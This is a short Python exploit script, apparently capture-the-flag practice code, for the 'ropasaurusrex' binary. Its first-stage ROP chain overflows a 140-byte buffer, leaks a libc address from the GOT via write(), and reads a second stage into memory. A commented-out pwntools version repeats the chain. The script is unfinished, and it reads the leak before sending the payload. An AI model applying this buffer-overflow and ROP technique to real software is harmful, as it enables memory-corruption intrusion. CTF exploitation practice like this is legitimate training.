#!/usr/bin/env python3

from bu6pwn.IO import Proc
from bu6pwn.ROP import ROP
#from pwn import *

#context.terminal=['tmux','splitw','-h']

offset = 140
BINPATH="/home/cr0c0/Downloads/ropasaurusrex"
addr_stage = 0x08049628 + 0x400

#io=gdb.debug(BINPATH)
#elf=ELF(BINPATH)
rop=ROP(BINPATH)
io=Proc(BINPATH, debug=True, display=False)

print("Stage1: leaking libc from __libs_start_main@GOT: {:#x}".format(rop.got("__libc_start_main")))
buf = rop.retfill(offset)
buf += rop.call("write", 1, rop.got("__libc_start_main"), 4)
buf += rop.call("read", 0, addr_stage, 4)
ref_addr = io.read(4)

"""
buf = b"A"*offset
buf += p32(elf.plt[b"write"])
buf += p32(0x080484b6)              # pppr
buf += p32(1)
buf += p32(elf.got[b"__libc_start_main"])
buf += p32(4)
buf += p32(elf.plt[b"read"])
buf += b"B"*4
buf += p32(0)
buf += p32(0x8049628 + 0x400)
buf += p32(100)
"""
#print(repr(buf[offset:]))

io.write(buf)
#io.sendline(buf)

print("Leaked: {}".format(ref_addr))

io.interact()
